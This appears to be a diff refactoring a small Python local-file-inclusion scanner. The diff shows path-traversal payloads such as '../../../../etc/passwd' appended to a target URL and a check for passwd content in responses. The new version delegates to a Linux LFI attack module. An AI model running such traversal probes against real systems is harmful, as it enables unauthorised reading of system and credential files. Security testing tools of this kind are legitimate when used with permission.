@@ -1,37 +1,20 @@
 from banner.banner import *
-from bs4 import BeautifulSoup
-from time import sleep
-import requests
+from arguments.checker import Checker
+from attacks.linux import LinuxLFI
 import argparse
 
 parse = argparse.ArgumentParser()
-parse.add_argument('-t','--target',help="Target",required=True)
-parse.add_argument('-e','--extract',help="Extract content", action='store_true',required=False)
-parse.add_argument('-p','--payload',help="Payloads file [Default = payloads.txt]",required=True)
+parse.add_argument('-t','--target',  help="Target", required=True)
+parse.add_argument('-wc', '--walkcount', help="Number of directories to walk up", required=True)
+parse.add_argument('-os', '--operatingsystem', help="Specify the operating system to check", required=True)
 parse = parse.parse_args()
 
-# MANUAL
-#payloads = ['/etc/passwd/','../../../../etc/passwd']
-
-payloads = open(parse.payload,'r')
-
-
-if parse.target:
+if parse.target and parse.walkcount:
 	banner()
 	print("\nURL target ->> {}\n".format(parse.target))
-	for p in payloads:
-		p = p.replace("\n","")
-		print("=" * 60)
-		print("Payload: {}".format(parse.target+p))
-		query = requests.get(parse.target+p)
-
-		if 'root' and 'bash' and '/bin' in query.text:
-			print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+p,END))
-			if parse.extract:
-				e = BeautifulSoup(query.text,'html5lib')
-				print(e.blockquote.text)
-		print("=" * 60,"\n")
-		
+	file_paths = Checker.get_payload_file(parse)
+	if parse.operatingsystem == 'linux':
+		LinuxLFI.execute_linux_attack(file_paths, parse)
 else:
 	print(f"{RED_NORMAL}[ERR0R]{END} Argument invalid\nRequest help : python3 LFIscanner.py --help\nExit the script...")
 	time.sleep(2)
